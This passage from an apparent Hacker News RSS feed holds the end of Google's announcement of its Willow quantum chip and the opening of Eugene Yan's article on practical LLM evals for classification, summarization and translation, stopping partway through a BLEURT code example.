    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Meet Willow, our state\u002Dof\u002Dthe\u002Dart quantum chip&quot;
         }"><h2 data-block-key="1hu6n">State-of-the-art performance</h2><p data-block-key="6gm2j">Willow was fabricated in our new, state-of-the-art fabrication facility in Santa Barbara — one of only a few facilities in the world built from the ground up for this purpose. System engineering is key when designing and fabricating quantum chips: All components of a chip, such as single and two-qubit gates, qubit reset, and readout, have to be simultaneously well engineered and integrated. If any component lags or if two components don't function well together, it drags down system performance. Therefore, maximizing system performance informs all aspects of our process, from chip architecture and fabrication to gate development and calibration. The achievements we report assess quantum computing systems holistically, not just one factor at a time.</p><p data-block-key="11pju">We’re focusing on quality, not just quantity — because just producing larger numbers of qubits doesn’t help if they’re not high enough quality. With 105 qubits, Willow now has best-in-class performance across the two system benchmarks discussed above: quantum error correction and random circuit sampling. Such algorithmic benchmarks are the best way to measure overall chip performance. Other more specific performance metrics are also important; for example, our T<sub>1</sub> times, which measure how long qubits can retain an excitation — the key quantum computational resource — are now approaching 100 µs (microseconds). This is an impressive ~5x improvement over our previous generation of chips. If you want to evaluate quantum hardware and compare across platforms, here is a table of key specifications:</p></div>
  

  
    







  
    
        <div data-analytics-module="{
            &quot;module_name&quot;: &quot;Inline Images&quot;,
            &quot;section_header&quot;: &quot;Meet Willow, our state\u002Dof\u002Dthe\u002Dart quantum chip&quot;
          }">
    

    <p><img alt="a table chart reading &quot;Willow System Metrics&quot; with columns showing details like number of qubits (105) and average connectivity (3.47)" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/KW_Fig3.width-100.format-webp.webp" loading="lazy" data-loading="{
                  &quot;mobile&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/KW_Fig3.width-500.format-webp.webp&quot;,
                  &quot;desktop&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/KW_Fig3.width-1000.format-webp.webp&quot;
                }">
          
        
      
      </p>
      
        <figcaption><p data-block-key="o0c76">Willow’s performance across a number of metrics.</p></figcaption>
      
    
      </div>
    
  



  

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Meet Willow, our state\u002Dof\u002Dthe\u002Dart quantum chip&quot;
         }"><h2 data-block-key="1hu6n">What’s next with Willow and beyond</h2><p data-block-key="5lnu5">The next challenge for the field is to demonstrate a first "useful, beyond-classical" computation on today's quantum chips that is relevant to a real-world application. We’re optimistic that the Willow generation of chips can help us achieve this goal. So far, there have been two separate types of experiments. On the one hand, we’ve run the RCS benchmark, which measures performance against classical computers but has no known real-world applications. On the other hand, we’ve done scientifically interesting simulations of quantum systems, which have led to new scientific discoveries but are still within the reach of classical computers. Our goal is to do both at the same time — to step into the realm of algorithms that are beyond the reach of classical computers <b>and</b> that are useful for real-world, commercially relevant problems.</p></div>
  

  
    







  
    
        <div data-analytics-module="{
            &quot;module_name&quot;: &quot;Inline Images&quot;,
            &quot;section_header&quot;: &quot;Meet Willow, our state\u002Dof\u002Dthe\u002Dart quantum chip&quot;
          }">
    

    <p><img alt="an illustrated chart reading &quot;Random Circuit Sampling (RCS): in context" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/KW_Fig2.width-100.format-webp.webp" loading="lazy" data-loading="{
                  &quot;mobile&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/KW_Fig2.width-500.format-webp.webp&quot;,
                  &quot;desktop&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/KW_Fig2.width-1000.format-webp.webp&quot;
                }">
          
        
      
      </p>
      
        <figcaption><p data-block-key="jgl7w">Random circuit sampling (RCS), while extremely challenging for classical computers, has yet to demonstrate practical commercial applications.</p></figcaption>
      
    
      </div>
    
  



  

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Meet Willow, our state\u002Dof\u002Dthe\u002Dart quantum chip&quot;
         }">
        <p data-block-key="rpsdd">We invite researchers, engineers, and developers to join us on this journey by checking out our <a href="https://quantumai.google/software">open source software</a> and educational resources, including our <a href="https://coursera.org/learn/quantum-error-correction">new course on Coursera</a>, where developers can learn the essentials of quantum error correction and help us create algorithms that can solve the problems of the future.</p>
      </div>
  

  
    







  
    
        <div data-analytics-module="{
            &quot;module_name&quot;: &quot;Inline Images&quot;,
            &quot;section_header&quot;: &quot;Meet Willow, our state\u002Dof\u002Dthe\u002Dart quantum chip&quot;
          }">
    

    <p><img alt="an illustrated card reading &quot;Our quantum computing roadmap&quot; and a timeline showing 6 milestones from &quot;Beyond classical&quot; to &quot;Large error-corrected quantum computer&quot;" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/KW_Fig4.width-100.format-webp.webp" loading="lazy" data-loading="{
                  &quot;mobile&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/KW_Fig4.width-500.format-webp.webp&quot;,
                  &quot;desktop&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/KW_Fig4.width-1000.format-webp.webp&quot;
                }">
          
        
      
      </p>
      
    
      </div>
    
  



  

  
    <div data-component="uni-article-paragraph" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;Meet Willow, our state\u002Dof\u002Dthe\u002Dart quantum chip&quot;
         }">
        <p data-block-key="489x7">My colleagues sometimes ask me why I left the burgeoning field of AI to focus on quantum computing. My answer is that both will prove to be the most transformational technologies of our time, but advanced AI will significantly benefit from access to quantum computing. This is why I named our lab Quantum AI. Quantum algorithms have fundamental scaling laws on their side, as we’re seeing with RCS. There are similar scaling advantages for many foundational computational tasks that are essential for AI. So quantum computation will be indispensable for collecting training data that’s inaccessible to classical machines, training and optimizing certain learning architectures, and modeling systems where quantum effects are important. This includes helping us discover new medicines, designing more efficient batteries for electric cars, and accelerating progress in fusion and new energy alternatives. Many of these future game-changing applications won’t be feasible on classical computers; they’re waiting to be unlocked with quantum computing.</p>
      </div>
  


            
            

            
              




            
          </div>
  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Task-Specific LLM Evals That Do and Don't Work (122 pts)]]></title>
            <link>https://eugeneyan.com/writing/evals/</link>
            <guid>42366481</guid>
            <pubDate>Mon, 09 Dec 2024 14:23:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://eugeneyan.com/writing/evals/">https://eugeneyan.com/writing/evals/</a>, See on <a href="https://news.ycombinator.com/item?id=42366481">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            



<!--https://docs.mathjax.org/en/latest/input/tex/delimiters.html-->

<p>If you’ve ran off-the-shelf evals for your tasks, you may have found that most don’t work. They barely correlate with application-specific performance and aren’t discriminative enough to use in production. As a result, we could spend weeks and still not have evals that reliably measure how we’re doing on our tasks.</p>

<p>To save us some time, I’m sharing some evals I’ve found useful. The goal is to spend less time figuring out evals so we can spend more time shipping to users. We’ll focus on simple, common tasks like classification/extraction, summarization, and translation. (Although classification evals are basic, having a good understanding helps with the meta problem of evaluating evals.) We’ll also discuss how to measure copyright regurgitation and toxicity.</p>
<ul>
  <li><a href="#classificationextraction-roc-pr-class-distributions">Classification</a>: Recall, precision, ROC-AUC, PR-AUC, separation of distributions</li>
  <li><a href="#summarization-consistency-relevance-length">Summarization</a>: Consistency via NLI, relevance via reward model, length checks</li>
  <li><a href="#translation-statistical--learned-evals-for-quality">Translation</a>: Quality measures via chrF, BLEURT, COMET, COMETKiwi</li>
  <li><a href="#copyright-regurgitation--near-exact-reproduction">Copyright</a>: Exact regurgitation, near-exact reproduction</li>
  <li><a href="#toxicity-realtoxicityprompts--bold">Toxicity</a>: Proportion of toxic generations on regular and toxic prompts</li>
</ul>

<p>At the end, we’ll discuss <a href="#nonetheless-we-still-need-human-evaluation">the role of human evaluation</a> and how to <a href="#calibrate-your-evaluation-bar-to-the-level-of-risk">calibrate the evaluation bar</a> to balance between potential benefits and risks, and mitigate Innovator’s Dilemma.</p>

<p>Note: I’ve tried to make this accessible for folks who don’t have a data science or machine learning background. Thus, it starts with the basics of classification eval metrics. Feel free to skip any sections you’re already familiar with.</p>



<p>Classification is the task of assigning predefined labels to text, such as sentiment (positive, negative) or topics (sports, politics). Extraction is similar, where we identify specific pieces of information within the text, such as names, dates, or locations. Here’s an example:</p>

<div><pre><code><span># Text input
</span><span>"Alice loves her iPhone 13 mini that she bought on September 16, 2022."</span>

<span># Classification and extraction output
</span><span>{</span>
    <span>"sentiment"</span><span>:</span> <span>"positive"</span><span>,</span>    <span># Sentiment classification
</span>    <span>"topic"</span><span>:</span> <span>"electronics"</span><span>,</span>     <span># Topic classification
</span>    <span>"toxicity_prob"</span><span>:</span> <span>"0.1"</span><span>,</span>     <span># Toxicity classification
</span>    <span>"names"</span><span>:</span> <span>[</span>                  <span># Name extraction
</span>        <span>"Alice"</span><span>,</span>
        <span>"iPhone 13 mini"</span>
    <span>],</span>
    <span>"dates"</span><span>:</span> <span>[</span>                  <span># Date extraction
</span>        <span>"September 16, 2022"</span>
    <span>]</span>
<span>}</span>
</code></pre></div>

<p>While these tasks are relatively simple and LLMs likely perform well on them, we’ll still want solid evaluations. For example, Voiceflow’s eval harness for intent classification helped them catch a <a href="https://www.voiceflow.com/blog/how-much-do-chatgpt-versions-affect-real-world-performance" target="_blank">10% performance drop</a> when upgrading from the deprecating gpt-3.5-turbo-0301 to the more recent gpt-3.5-turbo-1106.</p>

<p>We can apply LLMs for classification by providing a document and prompting the LLM to predict the sentiment or topic, or to check for abusive content or spam. The expected output can be a categorical label (“positive”) or the probability of the label (“0.1”). Similarly, LLMs can extract information from a document by prompting it to return JSON with keys for desired attributes such as “names” and “dates”.</p>

<p>For categorical outputs, we can compute aggregate statistics such as recall, precision, false positives/negatives. This also applies to extraction: What proportion of ground truth attributes were extracted (recall)? What proportion of extracted attributes were correct (precision)? The <a href="https://en.wikipedia.org/wiki/Precision_and_recall" target="_blank">Wikipedia page</a> is a good reference. In a nutshell:</p>
<ul>
  <li>Recall: Proportion of true positives that were correctly identified. If there were 100 positive instances in our data and the model identified 80, recall = 0.8</li>
  <li>Precision: Proportion of the model’s positive predictions that were correct. If the model predicted positive 50 times but only 30 were truly positive, precision = 0.6</li>
  <li>False positive: Model predicted positive but actually negative</li>
  <li>False negative: Model predicted negative but actually positive</li>
</ul>

<blockquote>
  <p>IMHO, accuracy is too coarse a metric to be useful. We’d need to separate it into recall and precision at minimum, ideally across thresholds.</p>
</blockquote>

<p>It gets interesting when our models can output probabilities instead of simply categorical labels (e.g., language classifiers, reward models). Now we can evaluate performance across different probability thresholds, using metrics such as ROC-AUC and PR-AUC.</p>

<p><strong>The <a href="https://en.wikipedia.org/wiki/Receiver_operating_characteristic" target="_blank">Receiver Operating Characteristic</a> (ROC) curve</strong> plots the true positive rate against the false positive rate at various thresholds, visualizing the performance of a classification model across all classification thresholds. The ROC Area Under the Curve (ROC-AUC) is an aggregate measure of performance that ranges from 0.0 to 1.0. A model that’s no better than a coin flip would have ROC-AUC = 0.5 while a model that’s always correct has ROC-AUC = 1.0. (Cramer would have <a href="https://www.reddit.com/r/wallstreetbets/comments/14aouri/when_in_doubt_inverse_cramer_it_out/" target="_blank">ROC-AUC &lt; 0.5</a>.)</p>

<p><img src="https://eugeneyan.com/assets/roc.png" loading="lazy" title="ROC curve with ROC-AUC = 0.85" alt="ROC curve with ROC-AUC = 0.85"></p>
<p>ROC curve with ROC-AUC = 0.85</p>

<p>ROC-AUC has some advantages. First, it’s robust to class imbalance because it specifically measures true and false positive rate. In addition, it doesn’t require picking a threshold since it evaluates performance across all thresholds. Finally, it is scale-invariant, thus it doesn’t matter if your model’s predictions are skewed.</p>

<p><strong>The <a href="https://scikit-learn.org/stable/auto_examples/model_selection/plot_precision_recall.html" target="_blank">Precision-Recall</a> curve</strong> plots the trade-off between precision and recall across all thresholds. As we update the threshold for positive predictions, precision and recall change in opposite directions. A higher threshold leads to higher precision (fewer false positives) but lower recall (more false negatives), and vice versa. The area under this curve, PR-AUC, summarizes performance across all thresholds. A perfect classifier has PR-AUC = 1.0 while a random classifier has PR-AUC = proportion of positive labels.</p>

<p><img src="https://eugeneyan.com/assets/pr.png" loading="lazy" title="PR curves with PR-AUC = 0.87" alt="PR curves with PR-AUC = 0.87"></p>
<p>PR curves with PR-AUC = 0.87</p>

<p>The standard PR curve (left below) plots precision and recall on the same line, starting from the top-right corner (high precision, low recall) and moving towards the bottom-left corner (low precision, high recall). I prefer a variant (right below) where precision and recall are plotted as separate lines—this makes it easier to understand the trade-off between precision and recall since they’re both on the y-axis.</p>

<p>Another useful diagnostic is plotting the <strong>distribution of predicted probabilities for each class</strong>. This visualizes how well the model is separating the classes. Ideally, we’d see two distinct peaks at 0.0 for the negative class and 1.0 for the positive class. This suggests that the model is confident in its predictions and can cleanly separate the classes. On the other hand, if there’s significant overlap between the distributions, it suggests that it may be difficult to pick a threshold to use in production.</p>

<p><img src="https://eugeneyan.com/assets/sep.png" loading="lazy" title="Good separation of distributions with JS divergence = 11.078" alt="Good separation of distributions with JS divergence = 11.078"></p>
<p>Good separation of distributions (JS divergence = 11.078)</p>

<p>To quantify the separation of distributions, we can compute the <a href="https://en.wikipedia.org/wiki/Jensen%E2%80%93Shannon_divergence" target="_blank">Jensen-Shannon divergence (JSD)</a>, a symmetric form of <a href="https://en.wikipedia.org/wiki/Kullback%E2%80%93Leibler_divergence" target="_blank">Kullback-Leibler (KL) divergence</a>. Concretely, we compute the average of KL divergence from (i) distribution $P$ to the average of $P$ and $Q$ ($M$) and (ii) from distribution $Q$ to the average of $P$ and $Q$ ($M$). Nonetheless, I’ve found JSD hard to interpret and prefer to look at the graph directly.</p><p>

\[\operatorname{JSD}(P \parallel Q) = \frac{1}{2} \left(\operatorname{KL}(P \parallel M) + \operatorname{KL}(Q \parallel M)\right)\]

</p><p>Examining the separation of distributions is valuable because <em>a model can have high ROC-AUC and PR-AUC but still not be suitable for production.</em> For example, if a chunk of the predicted probabilities fall between 0.4 and 0.6 (below), it’ll be hard to choose a threshold—getting it wrong by merely 0.05 could lead to a big drop in precision or recall. Examining the separation of distributions gives you a sense of this.</p>

<p><img src="https://eugeneyan.com/assets/poor-sep.png" loading="lazy" title="Poor separation of distributions with JS divergence = 1.101" alt="Poor separation of distributions with JS divergence = 1.101"></p>
<p>Poor separation of distributions (JS divergence = 1.101)</p>

<blockquote>
  <p>The plot above also shows why n-gram and vector similarity evals/guardrails don’t work. The similarity distributions of positive and negative instances are too close. <em>Thus, they are not discriminative enough to cut a threshold on.</em></p>
</blockquote>

<p>Together, these metrics provide a solid toolbox for diagnosing classification performance and picking good thresholds for production.</p>

<p><img src="https://eugeneyan.com/assets/post-ft.png" loading="lazy" title="Diagnostic plots for classification tasks" alt="Diagnostic plots for classification tasks"></p>
<p>Diagnostic plots for classification tasks</p>

<p>Now that we’ve the basics of evaluating classification tasks, we can discuss evals for summarization which, unsurprisingly, can be simplified to classification tasks too.</p>

<h2 id="summarization-consistency-relevance-length">Summarization: Consistency, relevance, length</h2>

<p>Abstractive summarization is the task of generating concise summaries that capture the key ideas in a source document. Unlike extractive summarization which lifts entire sentences from the original text, abstractive summarization involves rephrasing and condensing information to create a newer, shorter version. It requires understanding the content, identifying important points, and not introducing hallucination defects.</p>

<p>To evaluate abstractive summaries, <a href="https://arxiv.org/abs/1908.08960" target="_blank">Kryscinski et al. (2019)</a> proposed four key dimensions:</p>
<ul>
  <li>Fluency: Are sentences in the summary well-formed and easy to read? We want to avoid grammatical errors, random capitalization, etc.</li>
  <li>Coherence: Does the summary as a whole make sense? It should be well-structured and logically organized, and not just a jumble of information.</li>
  <li>Consistency: Does the summary accurately reflect the content of the source document? We want to ensure there’s no new or contradictory information added.</li>
  <li>Relevance: Does the summary focus on the most important aspects of the source document? It should include key points and exclude less relevant details.</li>
</ul>

<p>Most modern language models can generate grammatically correct and readable sentences, making fluency less of a concern. A <a href="https://arxiv.org/abs/2301.13848" target="_blank">recent benchmark</a>&nbsp;excluded fluency as an eval for this reason. Coherence is also becoming less of an issue, especially for short summaries containing a few sentences or less. This leaves us with factual consistency and relevance, which we can frame as binary classification and reuse the metrics from above.</p>

<blockquote>
  <p>I seldom see grammatical errors or incoherent text from a decent LLM (maybe 1 in 10k). Thus, no need to invest in evaluating fluency and coherence.</p>
</blockquote>

<blockquote>
  <p>While n-gram (ROUGE, METEOR), similarity (BERTScore, MoverScore), and LLM evals (G-Eval) are popular, <em>I’ve found them unreliable and/or impractical.</em> Thus, we won’t discuss them here. See a more detailed critique in the <a href="#appendix">appendix</a>.</p>
</blockquote>

<p><strong>To measure factual consistency</strong>, we can <a href="https://eugeneyan.com/writing/finetuning/" target="_blank">finetune a natural language inference (NLI) model as a learned metric</a>. A recap on the NLI task: Given a premise sentence and a hypothesis sentence, the task is to predict whether the hypothesis is entailed by (logically flows from), neutral to, or contradicts the premise.</p>

<p><img src="https://eugeneyan.com/assets/nli.jpg" loading="lazy" title="Premise and hypothesis for the Natural Language Inference Task" alt="Premise and hypothesis for the Natural Language Inference Task"></p>
<p>Premise and hypothesis for the Natural Language Inference Task</p>

<p>We can use NLI models to evaluate the factual consistency of summaries too. The key insight is to treat the source document as the premise and the generated summary as the hypothesis. If the summary contradicts the source, then the summary is factually inconsistent aka a hallucination.</p>

<p><img src="https://eugeneyan.com/assets/summary-nli.jpg" loading="lazy" title="Document and summary for the Natural Language Inference Task" alt="Document and summary for the Natural Language Inference Task"></p>
<p>Document and summary for the Natural Language Inference Task</p>

<p>By default, NLI models return probabilities for entailment, neutral, and contraction. To get the probability of factual <em>inconsistency</em>, we drop the neutral dimension, apply a softmax to the remaining entailment and contradiction dimensions, and take the probability of contradiction. Be sure to check what your NLI model’s dimension represents—<a href="https://huggingface.co/google/t5_11b_trueteacher_and_anli" target="_blank">Google’s T5 NLI model</a> has entailment at dim = 1 while <a href="https://huggingface.co/facebook/bart-large-mnli" target="_blank">Meta’s BART NLI model</a> has it at dim = 2!</p>

<div><pre><code><span>def</span> <span>get_prob_of_contradiction</span><span>(</span><span>logits</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>)</span> <span>-&gt;</span> <span>torch</span><span>.</span><span>Tensor</span><span>:</span>
    <span>"""
    Returns probability of contradiction aka factual inconsistency.
    
    Args:
        logits (torch.Tensor): Tensor of shape (batch_size, 3). The second dimension 
        represents the probabilities of contradiction, neutral, and entailment.

    Returns:
        torch.Tensor: Tensor of shape (batch_size,) with probability of contradiction.

    Note:
        This function assumes the probability of contradiction is in index 0 of logits.
    """</span>
    
    <span># Drop neutral logit (index=1), softmax, and get prob of contradiction (index=0)
</span>    <span>prob</span> <span>=</span> <span>F</span><span>.</span><span>softmax</span><span>(</span><span>logits</span><span>[:,</span> <span>[</span><span>0</span><span>,</span> <span>2</span><span>]],</span> <span>dim</span><span>=</span><span>1</span><span>)[:,</span> <span>0</span><span>]</span>
    
    <span>return</span> <span>prob</span>
</code></pre></div>

<p>With a few hundred task-specific samples, the model starts to identify obvious factual inconsistencies and likely outperforms n-gram, similarity, and LLM-based evals. <em>With a thousand samples or more, it becomes a solid factual consistency eval and may be good enough as a hallucination guardrail.</em> To reduce the need for data annotation, we can <a href="https://eugeneyan.com/writing/finetuning/" target="_blank">bootstrap with open-source, permissive use data</a> such as the <a href="https://arxiv.org/abs/2211.08412" target="_blank">Factual Inconsistency Benchmark (FIB)</a> and the <a href="https://arxiv.org/abs/2305.14296" target="_blank">Unified Summarization Benchmark (USB)</a>.</p>

<p>The graphs below plot the performance of NLI evals for factual inconsistency on FIB. The top graphs have performance pre-finetuning while the bottom graphs show performance after finetuning on USB and FIB. While there’s certainly room for improvement, it shows how a little finetuning on open-source, permissive-use data can help improve ROC-AUC from 0.56 (which is practically random) to 0.85!</p>

<p><img src="https://eugeneyan.com/assets/pre-ft.png" loading="lazy" title="Plots for the NLI-based eval of factual inconsistency before finetuning" alt="Plots for the NLI-based eval of factual inconsistency before finetuning">
<img src="https://eugeneyan.com/assets/post-ft.png" loading="lazy" title="Plots for the NLI-based eval of factual inconsistency after finetuning" alt="Plots for the NLI-based eval of factual inconsistency after finetuning"></p>
<p>Factual inconsistency eval before (top; ROC-AUC=0.56) and after (bottom; ROC-AUC=0.85) finetuning</p>

<blockquote>
  <p>I think it’s hard to beat the NLI approach to evaluate and/or detect factual inconsistency in terms of ROI. If you know of anything better, please <a href="https://twitter.com/eugeneyan" target="_blank">DM me</a>!</p>
</blockquote>

<p><strong>The same paradigm can also be applied to develop a learned metric of <em>relevance</em>.</strong> In a nutshell, we’d collect human judgments on the <em>relevance</em> of generated summaries and then finetune an NLI model to predict these relevance ratings.</p>

<p><strong>An alternative is to train a reward model on human preferences.</strong> <a href="https://arxiv.org/abs/2009.01325" target="_blank">Stiennon et al. (2020)</a>, the predecessor of InstructGPT, trained a reward model to evaluate abstractive summaries of Reddit posts. <a href="https://arxiv.org/abs/2109.10862" target="_blank">Wu et al. (2021)</a>&nbsp;also did similar work with fiction novels.</p>

<p>In Stiennon et al. (2020), they updated their summarization language model to return a numeric score instead of a text summary, making it a reward model that scores the quality of summaries. This is done by adding a linear head that outputs a scalar value. It was then trained on pairs of summary preferences to give higher scores to better summaries. For each pair of summaries $y_0$ and $y_1$, they minimize the following loss function:</p><p>

\[\text{loss}(r_{\theta}) = - \mathbb{E}_{(x, y_0, y_1, i) \sim D} \left[ \log \left( \sigma \left( r_{\theta}(x, y_i) - r_{\theta}(x, y_{1-i}) \right) \right) \right]\]

</p><p>Intuitively, this loss function encourages the reward model to give a higher score to the summary preferred by humans. The sigmoid function $\sigma$ squashes the difference in rewards (between the two summaries) to between 0.0 and 1.0. After training, they normalize the reward model’s output so that the reference summaries from their dataset achieve a mean score of zero. This provides a baseline for comparing the quality of generated summaries.</p>

<p><strong>A related task is opinion summarization</strong>. This is where we generate a summary that captures the key aspects and associated sentiments from a set of opinions, such as customer feedback, social media, or product reviews. We adapt the metrics of consistency and relevancy for:</p>
<ul>
  <li>Sentiment consistency: For each key aspect, does the summary accurately reflect the overall sentiment expressed? For example, if most reviews praise the battery life but criticize the camera quality, the summary should capture this.</li>
  <li>Aspect relevance: Does the summary cover the main topics discussed? If many reviews raise concerns about battery life and camera quality, these points should be included in the summary.</li>
</ul>

<p>The <a href="https://arxiv.org/abs/2310.18122" target="_blank">OpinSummEval</a> paper explored several evals and found two to be most effective: <a href="https://arxiv.org/abs/2106.11520" target="_blank">BARTScore</a> and Question-Answering (QA) based evals. It uses the test set from the <a href="https://arxiv.org/abs/1810.05739" target="_blank">Yelp dataset</a> which contains 100 instances of (i) eight reviews of the same product/service and (ii) one human-written review summary.</p>

<p><strong>BARTScore treats evaluation as a text-generation task.</strong> It uses pre-trained <a href="https://arxiv.org/abs/1910.13461" target="_blank">BART</a> to compute the conditional probability of the summary $y$ given the reviews $x$. The score is essentially the log-likelihood of generating the summary from the reviews.</p><p>

\[\text{BARTScore} = \sum_{t} \omega_t \log p(y_t|y_{&lt;t}, x, \theta)\]

</p><p>$y_t$ represents the token at position $t$. Weights $w_t$ can be used to emphasize different tokens or just left as equal for all tokens.</p>

<p>They tried a few variants of BARTScore and found $\text{BARTScore}_{rev→hyp}$ to perform the best. First, they encode the reviews ($rev$) and summary ($hyp$) via the encoder. Then, they use the encoded reviews as the source sequence and the encoded summary as the target sequence for the decoder. The decoder computes the probability of generating each summary token given the reviews and previously generated summary tokens. The probabilities are then summed and normalized by the length of the summary to get the final score.</p>

<p><strong>QA-based evals take a more roundabout approach.</strong> The idea is to generate questions about the reviews, answer them based on the summary, and then compare the answers to the original reviews. This typically involves several steps such as:</p>
<ul>
  <li>Selecting key phrases or sentences from the reviews as “answers”</li>
  <li>Generating questions based on these answers and the review text</li>
  <li>Answering questions based on the summary via a QA model</li>
  <li>Comparing the QA model’s answers to the original answer</li>
</ul>

<p>The intuition here is that a good summary should contain the information needed to answer relevant questions about the reviews. If the QA model can produce similar answers from the summary as from the reviews themselves, this suggests that the summary captured the key aspects and sentiments correctly.</p>

<blockquote>
  <p>While QA evals did well in OpinSummEval, IMHO, they’re too complex. We’d need separate models for answer selection, question generation, and question answering, plus a way to evaluate overlap between reference and generated answers. In contrast, NLI and BARTScore evals are simpler and more direct.</p>
</blockquote>

<p><strong>A final eval to consider is length adherence.</strong> This measures whether the model can follow instructions and n-shot examples to generate summaries that meet a word or character limit. Length adherence is crucial for many real-world applications where space is limited, such as push notifications or review summary snippets. Evaluating this is straightforward—we can simply count the number of words or characters in the generated summary.</p>

<h2 id="translation-statistical--learned-evals-for-quality">Translation: Statistical &amp; learned evals for quality</h2>

<p>Machine translation is the task of automatically converting text from one language to another. The goal is to preserve the original meaning and intent while producing translations that are fluent and grammatically correct in the target language.</p>

<p>There are countless evals for machine translation. To narrow it down, we can look to the annual <a href="https://www2.statmt.org/wmt23/" target="_blank">Workshop on Machine Translation (WMT)</a> for guidance. We’ll focus on three reference-based evals (which compare the machine translation to a human-written reference translation) and one reference-free eval:</p>
<ul>
  <li>Statistical metric: chrF</li>
  <li>Learned metric: BLEURT, COMET</li>
  <li>Learned metric (reference-free): COMETKiwi</li>
</ul>

<blockquote>
  <p>What about BLEU (Bilingual Evaluation Understudy)? While it’s the most used translation eval, it’s also bottom of the leaderboard at <a href="https://aclanthology.org/2022.wmt-1.2/" target="_blank">WMT22</a> and <a href="https://aclanthology.org/2023.wmt-1.51/" target="_blank">WMT23</a>. In contrast, the evals above do better and have been adopted as baselines at WMT.</p>
</blockquote>

<p><strong><a href="https://aclanthology.org/W15-3049/" target="_blank">chrF (character n-gram F-score)</a></strong> is similar to BLEU but operates at the character level instead of the word level. It’s the second most popular metric for machine translation and has several advantages over BLEU (which we’ll get to in a bit).</p>

<p>The idea behind chrF is to compute the precision and recall of character n-grams between the machine translation (MT) and the reference translation. Precision ($chrP$) measures the proportion of character n-grams in the MT that match the reference. Recall ($chrR$) measures the proportion of character n-grams in the reference that are captured by the MT. This is done for various values of $n$ (typically up to 6). To combine $chrP$ and $chrR$, we use a harmonic mean with $\beta$ as a parameter that controls the relative importance of precision and recall. When $\beta = 1$, precision and recall have equal weight. Higher values of $\beta$ assign more importance to recall.</p><p>

\[\text{chrF}\beta = (1 + \beta^2) \frac{\text{chrP} \cdot \text{chrR}}{\beta^2 \cdot \text{chrP} + \text{chrR}}\]

</p><p>One benefit of chrF is that it doesn’t require pre-tokenization since it operates directly on the character level. This makes it easy to apply to languages with complex morphology or non-standard written forms. It is also computationally efficient as it mostly involves string-matching operations that can be parallelized and run on CPU. In addition, it is language-independent and can be used to evaluate translations over many language pairs. This is an advantage over learned metrics, such as BLEURT and COMET, which need to be trained for each language pair. Thus, while chrF doesn’t capture higher-level aspects of translation quality such as fluency, coherence, and adequacy, it’s a solid eval to start with.</p>

<p><a href="https://github.com/mjpost/sacrebleu" target="_blank">sacreBLEU</a> provides a standardized implementation of chrF (and other metrics), ensuring consistent results across different systems and tasks.</p>

<p><strong><a href="https://arxiv.org/abs/2004.04696" target="_blank">BLEURT</a> was introduced by Google Research in 2020</strong> as an improvement over BLEU. It’s built on the popular <a href="https://arxiv.org/abs/1810.04805" target="_blank">BERT</a> model to offer a more nuanced and human-like assessment of translation accuracy. BLEURT-20 was trained on human ratings from WMT metrics 2017 to 2019 and evaluated on WMT20. It performed well in <a href="https://aclanthology.org/2021.wmt-1.73/" target="_blank">WMT21</a> and has since been used as a baseline in <a href="https://aclanthology.org/2022.wmt-1.2/" target="_blank">WMT22</a> and <a href="https://aclanthology.org/2023.wmt-1.51/" target="_blank">WMT23</a>.</p>

<p>The model is finetuned via two steps. In the first step (which is unfortunately named pre-training in the paper), they generate 6.5M synthetic sentence pairs by randomly perturbing 1.8M sentences from Wikipedia. There were three forms of perturbations:</p>
<ul>
  <li>Mask-filling: Insert masks at random positions and sequences, similar to BERT’s masked language modeling task. This teaches the model to fill in missing words.</li>
  <li>Backtranslation: Translate sentences from English to another language and then back to English via an existing translation model. The goal is to create paraphrases that preserve the original meaning while varying the surface form.</li>
  <li>Word dropout: Randomly remove words from the sentence. This teaches the model to deal with incomplete or noisy input.</li>
</ul>

<p>Via these perturbations, BLEURT’s first finetuning phase exposes the model to synthetic translations with errors and variations. The model is then trained to predict a combination of automated metrics (below) for the synthetic pairs. The intuition is that by learning from multiple metrics, BLEURT can capture their strengths while avoiding their weaknesses. This step is costly and typically skipped by loading a checkpoint that has completed it.</p>

<p><img src="https://eugeneyan.com/assets/bleurt.jpg" loading="lazy" title="Various objectives for BLEURT's first finetuning step" alt="Various objectives for BLEURT's first finetuning step"></p>
<p>Various objectives for BLEURT's first finetuning step</p>

<p>In the second finetuning step, BLEURT is finetuned on human ratings of machine translations. This aligns the model’s predictions with human judgments of quality, the eval we ultimately care about. The training data comes from previous years of WMT metrics tasks where human annotators rate translations on a scale of 0 to 100.</p>

<p>To use BLEURT, we provide pairs of candidate and reference translations, and the model returns a score from each pair. An <a href="https://github.com/google-research/bleurt" target="_blank">implementation</a> is available from Google Research and has an Apache-2.0 license. Use the BLEURT-20 checkpoint which generates scores between 0 and 1, where 0 = random output and 1 = perfect output.</p>

<div><pre><code><span>from</span> <span>bleurt</span> <span>import</span> <span>score</span>

<span>checkpoint</span> <span>=</span> <span>"bleurt/test_checkpoint"</span>
<span>references</span> <span>=</span> <span>[</span><span>"Esta es la prueba."</span><span>]</span>
<span>candidates</span> <span>=</span> <span>[</span><span>"Esto es una prueba."</span><span>]</span>

